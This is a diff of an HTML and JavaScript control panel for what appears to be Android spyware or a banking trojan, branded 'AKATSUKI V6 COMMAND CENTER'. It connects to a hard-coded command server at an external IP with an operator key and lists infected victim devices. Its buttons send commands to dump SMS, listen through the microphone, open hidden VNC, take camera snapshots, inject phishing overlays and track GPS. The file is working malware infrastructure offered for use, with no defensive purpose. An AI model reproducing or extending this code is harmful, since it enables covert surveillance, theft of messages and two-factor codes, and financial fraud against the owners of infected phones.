@@ -2,155 +2,141 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AKATSUKI | COMMAND CENTER</title>
+    <title>AKATSUKI V6 | COMMAND CENTER</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
-        :root { --red: #ff1a1a; --bg: #0a0a0a; --panel: #121212; --border: #1f1f1f; --text: #d1d1d1; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', 'Courier New', monospace; }
-        body { background: var(--bg); color: var(--text); height: 100vh; display: flex; overflow: hidden; }
+        :root { --red: #ff1a1a; --bg: #050505; --panel: #111; --border: #222; --text: #eee; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: var(--bg); color: var(--text); display: flex; height: 100vh; overflow: hidden; }
 
-        /* SIDEBAR (Match your screenshot) */
-        aside { width: 260px; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
-        .logo-box { padding: 30px; text-align: center; border-bottom: 1px solid var(--border); }
-        .nav-list { flex: 1; padding: 10px 0; overflow-y: auto; }
-        .nav-item { padding: 15px 25px; font-size: 13px; color: #888; cursor: pointer; display: flex; align-items: center; transition: 0.2s; }
-        .nav-item:hover, .nav-item.active { color: #fff; background: linear-gradient(90deg, rgba(255, 26, 26, 0.1) 0%, transparent 100%); border-left: 4px solid var(--red); }
-        .nav-item i { margin-right: 15px; color: var(--red); }
+        /* SIDEBAR */
+        aside { width: 280px; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
+        .logo { padding: 30px; text-align: center; color: var(--red); font-weight: bold; letter-spacing: 5px; border-bottom: 1px solid var(--border); }
+        .nav { flex: 1; padding: 10px 0; overflow-y: auto; }
+        .nav-item { padding: 12px 25px; color: #777; cursor: pointer; font-size: 13px; display: flex; align-items: center; transition: 0.3s; }
+        .nav-item:hover { color: #fff; background: rgba(255, 26, 26, 0.1); border-left: 3px solid var(--red); }
 
-        /* MAIN SECTION */
+        /* MAIN DASHBOARD */
         main { flex: 1; display: flex; flex-direction: column; }
-        header { height: 60px; background: #000; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 30px; font-size: 12px; }
-        
-        .container { flex: 1; padding: 25px; overflow-y: auto; }
-        .device-card { background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border); border-radius: 4px; padding: 20px; margin-bottom: 15px; position: relative; }
-        .device-card.offline { border-left: 4px solid #444; opacity: 0.7; }
-        .device-card.online { border-left: 4px solid #00ff00; }
-        
-        .card-header { display: flex; justify-content: space-between; margin-bottom: 15px; }
-        .status-tag { font-size: 10px; text-transform: uppercase; padding: 2px 8px; border-radius: 10px; background: #222; }
-        
-        .data-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; margin-bottom: 15px; }
-        .info-label { font-size: 11px; color: #555; }
-        .info-val { font-size: 14px; color: #fff; margin-top: 4px; }
+        header { padding: 20px 40px; background: #000; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+        .grid { flex: 1; padding: 30px; display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; overflow-y: auto; }
 
-        /* ACTIONS */
-        .action-row { display: flex; gap: 10px; border-top: 1px solid #1a1a1a; padding-top: 15px; flex-wrap: wrap; }
-        .btn { background: #111; border: 1px solid #222; color: #777; padding: 8px 15px; font-size: 11px; cursor: pointer; border-radius: 2px; }
-        .btn:hover { background: var(--red); color: white; border-color: var(--red); }
+        /* DEVICE CARD */
+        .card { background: var(--panel); border: 1px solid var(--border); border-radius: 5px; padding: 20px; transition: 0.3s; }
+        .card:hover { border-color: var(--red); box-shadow: 0 0 15px rgba(255, 26, 26, 0.1); }
+        .card-title { color: var(--red); font-size: 18px; margin-bottom: 10px; display: flex; justify-content: space-between; }
+        .attack-box { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-top: 15px; }
+        .btn-atk { background: #000; border: 1px solid #333; color: #888; padding: 8px; font-size: 10px; cursor: pointer; border-radius: 3px; text-transform: uppercase; }
+        .btn-atk:hover { background: var(--red); color: #fff; border-color: var(--red); }
 
-        /* MODAL FOR SMS/LOGS */
-        #log-viewer { position: fixed; right: 0; top: 0; bottom: 0; width: 400px; background: #000; border-left: 1px solid var(--border); padding: 20px; z-index: 100; transform: translateX(100%); transition: 0.3s; }
-        #log-viewer.open { transform: translateX(0); }
+        /* REAL-TIME TERMINAL MODAL */
+        #terminal { position: fixed; bottom: 20px; right: 20px; width: 450px; height: 500px; background: #000; border: 1px solid var(--red); border-radius: 8px; display: none; flex-direction: column; z-index: 1000; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
+        .term-head { padding: 10px; background: var(--red); color: #000; font-weight: bold; font-size: 12px; display: flex; justify-content: space-between; }
+        .term-body { flex: 1; padding: 15px; font-family: 'Consolas', monospace; font-size: 12px; overflow-y: auto; color: #00ff00; line-height: 1.5; }
+        .close-term { cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <aside>
-    <div class="logo-box">
-        <h2 style="color:white; font-size: 20px; letter-spacing: 3px;">AKATSUKI</h2>
-    </div>
-    <div class="nav-list">
-        <div class="nav-item active">🏠 Home</div>
+    <div class="logo">AKATSUKI</div>
+    <div class="nav">
+        <div class="nav-item">🏠 Dashboard</div>
+        <div class="nav-item">📡 Realtime Map</div>
         <div class="nav-item">🖥️ Hidden VNC</div>
-        <div class="nav-item">💉 Inject</div>
-        <div class="nav-item">🏛️ Phishing</div>
-        <div class="nav-item">👤 Steal Identity</div>
-        <div class="nav-item">🛡️ App Firewall</div>
-        <div class="nav-item">🔔 Notifications</div>
-        <div class="nav-item">💬 Messages</div>
-        <div class="nav-item">↗️ Call Forwarding</div>
-        <div class="nav-item">🚀 Launch Intent</div>
+        <div class="nav-item">📂 File Manager</div>
+        <div class="nav-item">🏛️ Phishing Center</div>
+        <div class="nav-item">🎙️ Mic Listening</div>
+        <div class="nav-item">💬 SMS Intercept</div>
+        <div class="nav-item">📞 Call Logs</div>
     </div>
 </aside>
 
 <main>
     <header>
-        <div id="op-status">OPERATOR: STANDBY</div>
-        <div style="color:var(--red)">V6.0 [MASTER_CORE]</div>
+        <div>STATUS: <span id="conn-status" style="color: #00ff00;">CONNECTED</span></div>
+        <div style="color: var(--red)">51.75.118.169:20300</div>
     </header>
-    <div class="container" id="grid">
+    <div class="grid" id="device-grid">
         </div>
 </main>
 
-<div id="log-viewer">
-    <h3 style="color:var(--red); margin-bottom: 20px;">LIVE LOGS</h3>
-    <div id="log-content" style="font-size: 12px; color: #aaa; height: 90%; overflow-y: auto;">
-        Waiting for incoming data...
+<div id="terminal">
+    <div class="term-head">
+        <span id="term-title">LIVE_ATTACK_LOGS</span>
+        <span class="close-term" onclick="closeTerminal()">[X]</span>
     </div>
-    <button class="btn" style="width: 100%" onclick="closeLogs()">CLOSE</button>
+    <div class="term-body" id="term-content">
+        Waiting for device response...
+    </div>
 </div>
 
 <script>
-    const socket = io("http://51.75.118.169:20300", { query: { type: 'mastermind', key: 'octopus_god_mode' } });
+    const socket = io("http://51.75.118.169:20300", { 
+        query: { type: 'mastermind', key: 'octopus_god_mode' } 
+    });
 
     socket.on('load_targets', (targets) => {
-        Object.keys(targets).forEach(id => renderDevice(id, targets[id]));
+        Object.keys(targets).forEach(id => addDevice(id, targets[id]));
     });
 
-    socket.on('update_grid', (res) => renderDevice(res.id, res.data));
+    socket.on('update_grid', (res) => addDevice(res.id, res.data));
 
+    // RECEIVE DATA (SMS, MIC, ETC)
     socket.on('render_live_data', (payload) => {
-        const viewer = document.getElementById('log-viewer');
-        const content = document.getElementById('log-content');
-        viewer.classList.add('open');
-        content.innerHTML += `<div style="margin-bottom:10px; border-bottom:1px solid #111; padding-bottom:5px;">
-            <span style="color:var(--red)">[${payload.type}]</span> ${payload.data}
-        </div>`;
+        openTerminal(payload.type);
+        const content = document.getElementById('term-content');
+        const time = new Date().toLocaleTimeString();
+        content.innerHTML += `<div style="margin-bottom:8px;">[${time}] <span style="color:white">${payload.data}</span></div>`;
+        content.scrollTop = content.scrollHeight;
     });
 
-    function renderDevice(id, data) {
-        let grid = document.getElementById('grid');
+    function addDevice(id, data) {
+        let grid = document.getElementById('device-grid');
         let card = document.getElementById(id);
         
-        const content = `
-            <div class="card-header">
-                <span class="status-tag" style="color:#00ff00">● Online</span>
-                <span style="color:#444; font-size:10px;">ID: ${id}</span>
+        const html = `
+            <div class="card-title">
+                <span>${data.model || 'Unknown Device'}</span>
+                <span style="font-size:10px; color:#555;">${id.substring(0,8)}</span>
             </div>
-            <div class="data-grid">
-                <div>
-                    <div class="info-label">Device Model</div>
-                    <div class="info-val">${data.model || 'Unknown Android'}</div>
-                    <div style="margin-top:15px;">
-                        <div class="info-label">Country/Region</div>
-                        <div class="info-val">${data.ip || 'Unknown'}</div>
-                    </div>
-                </div>
-                <div style="text-align: right;">
-                    <div class="info-label">Battery</div>
-                    <div class="info-val" style="color:var(--red)">${data.battery || 0}%</div>
-                    <div style="margin-top:15px;">
-                        <div class="info-label">Last Ping</div>
-                        <div class="info-val" style="font-size:11px;">${new Date().toLocaleTimeString()}</div>
-                    </div>
-                </div>
-            </div>
-            <div class="action-row">
-                <button class="btn" onclick="cmd('${id}','vnc')">VNC</button>
-                <button class="btn" onclick="cmd('${id}','sms_dump')">GET SMS</button>
-                <button class="btn" onclick="cmd('${id}','inject_phish')">INJECT</button>
-                <button class="btn" onclick="cmd('${id}','cam_snap')">CAMERA</button>
-                <button class="btn" style="color:white; border-color:var(--red)" onclick="cmd('${id}','kill')">KILL</button>
+            <p style="font-size:11px; color:#666;">IP: ${data.ip || '0.0.0.0'} | Battery: ${data.battery || '--'}%</p>
+            <div class="attack-box">
+                <button class="btn-atk" onclick="exec('${id}','sms_dump')">Get SMS</button>
+                <button class="btn-atk" onclick="exec('${id}','mic_live')">Mic Access</button>
+                <button class="btn-atk" onclick="exec('${id}','vnc_hidden')">Hidden VNC</button>
+                <button class="btn-atk" onclick="exec('${id}','cam_snap')">Camera</button>
+                <button class="btn-atk" onclick="exec('${id}','inject_app')">Inject</button>
+                <button class="btn-atk" onclick="exec('${id}','gps_track')">GPS</button>
             </div>
         `;
 
         if(card) {
-            card.innerHTML = content;
+            card.innerHTML = html;
         } else {
             const div = document.createElement('div');
             div.id = id;
-            div.className = 'device-card online';
-            div.innerHTML = content;
+            div.className = 'card';
+            div.innerHTML = html;
             grid.appendChild(div);
         }
     }
 
-    function cmd(tid, act) { 
-        socket.emit('run_action', { targetId: tid, action: act }); 
-        document.getElementById('op-status').innerText = "EXECUTING: " + act;
+    function exec(targetId, action) {
+        socket.emit('run_action', { targetId, action });
+        openTerminal(action.toUpperCase());
+        document.getElementById('term-content').innerHTML = `[!] Command Sent: ${action}<br>[*] Awaiting Target Response...<br>`;
     }
 
-    function closeLogs() { document.getElementById('log-viewer').classList.remove('open'); }
+    function openTerminal(title) {
+        document.getElementById('terminal').style.display = 'flex';
+        document.getElementById('term-title').innerText = "LIVE_DATA: " + title;
+    }
+
+    function closeTerminal() {
+        document.getElementById('terminal').style.display = 'none';
+        document.getElementById('term-content').innerHTML = "";
+    }
 </script>
 
 </body>
